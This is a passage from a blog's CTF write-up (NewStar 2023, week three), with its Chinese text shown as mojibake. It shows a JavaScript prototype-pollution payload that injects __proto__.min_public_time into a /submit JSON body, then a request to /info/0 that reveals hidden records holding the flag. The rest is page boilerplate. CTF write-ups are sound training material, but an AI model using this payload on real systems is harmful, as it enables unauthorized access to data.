<p><img src="/images/2023-11-3-newstar-3/image-20231028170420211.png" srcset="/img/loading.gif" lazyload alt="image-20231028170420211"></p>
<p>å‘ç°æ²¡æœ‰dataæ•°æ®è¿”å›ï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬è¾“å…¥çš„æ—¶é—´æˆ³tså·²ç»å¤§äºç³»ç»Ÿé»˜è®¤çš„æ—¶é—´æˆ³ï¼Œæ‰€ä»¥è¿”å›æˆ‘ä»¬tsä¹‹ä¸Šçš„dataæ•°æ®è®°å½•</p>
<p>çŒœæµ‹:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">å½“å‰æ•°æ®åº“è¿”å›çš„å†…å®¹æ˜¯åœ¨ç³»ç»Ÿé…ç½®çš„é»˜è®¤æ—¶é—´ä¹‹ä¸Šçš„ä¿¡æ¯ï¼Œå³ç”±äºä»£ç çš„æ—¶é—´è¿‡æ»¤ï¼Œæœ€å¤šå›æ˜¾é…ç½®æ—¶é—´ä¹‹ä¸Šçš„ä¿¡æ¯ï¼Œæˆ‘ä»¬æ— æ³•æŸ¥çœ‹é…ç½®æ—¶é—´ä¹‹ä¸‹çš„æ•°æ®åº“ä¸­çš„ä¿¡æ¯ï¼Œä¹Ÿè®¸flagå°±åœ¨é…ç½®æ—¶é—´ä¹‹ä¸‹çš„è®°å½•ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ›´æ”¹é»˜è®¤é…ç½®çš„æ—¶é—´ï¼Œä½¿å…¶å˜å¾—å¾ˆå°ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æŸ¥çœ‹æ•°æ®åº“ä¸­æ›´å¤šçš„ä¿¡æ¯<br></code></pre></td></tr></table></figure>

<p>jsåŸå‹é“¾æ±¡æŸ“:</p>
<p>payload:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-variable constant_">POST</span> /submit <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.</span>1Content-<span class="hljs-title class_">Type</span>: application/json<br><br>&#123;  <br>    <span class="hljs-string">&quot;contact&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,  <br>    <span class="hljs-string">&quot;reason&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,  <br>    <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;    <br>        <span class="hljs-string">&quot;min_public_time&quot;</span>: <span class="hljs-string">&quot;1001-01-01&quot;</span>  <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231028171513867.png" srcset="/img/loading.gif" lazyload alt="image-20231028171513867"></p>
<p>è·å–æˆ‘ä»¬ä¿®æ”¹é»˜è®¤é…ç½®æ—¶é—´åæ•°æ®åº“ä¸­çš„ä¿¡æ¯(0æ˜¯æœ€å°çš„æ—¶é—´æˆ³ï¼Œæ‰€ä»¥ä¸€å®šèƒ½è¿”å›â€min_public_timeâ€: â€œ1001-01-01â€ä¹‹ä¸Šæ—¶é—´çš„ä¿¡æ¯):<br>payload:</p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">/info/0<br><br>Content-Type:  application/x-www-form-urlencoded<br></code></pre></td></tr></table></figure>

<p><img src="/images/2023-11-3-newstar-3/image-20231028171757647.png" srcset="/img/loading.gif" lazyload alt="image-20231028171757647"></p>
<p>è¿”å›äº†æ•°æ®åº“ä¸­æ›´å¤šçš„ä¿¡æ¯ï¼Œåœ¨è¿™äº›é¢å¤–çš„ä¿¡æ¯ä¸­æŸ¥æ‰¾flag:<br><img src="/images/2023-11-3-newstar-3/image-20231028171854336.png" srcset="/img/loading.gif" lazyload alt="image-20231028171854336"></p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>Newstaræ–°ç”Ÿèµ›2023ç¬¬ä¸‰å‘¨WP</div>
      <div>http://example.com/2023/11/03/2023-11-3-newstarweek3/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>South</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2023å¹´11æœˆ3æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/10/09/2023-10-9-newstarweek2/" title="NewStarCTF 2023_ç¬¬äºŒå‘¨WP">
                        <span class="hidden-mobile">NewStarCTF 2023_ç¬¬äºŒå‘¨WP</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"ThR4XZRMA2SwXDt3MeF5vjCN-gzGzoHsz","appKey":"PmUqfFPhyiQDRYmHOO0IXjTV","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        æ€»è®¿é—®é‡
        <span id="busuanzi_value_site_pv"></span>
        æ¬¡
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        æ€»è®¿å®¢æ•°
        <span id="busuanzi_value_site_uv"></span>
        äºº
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
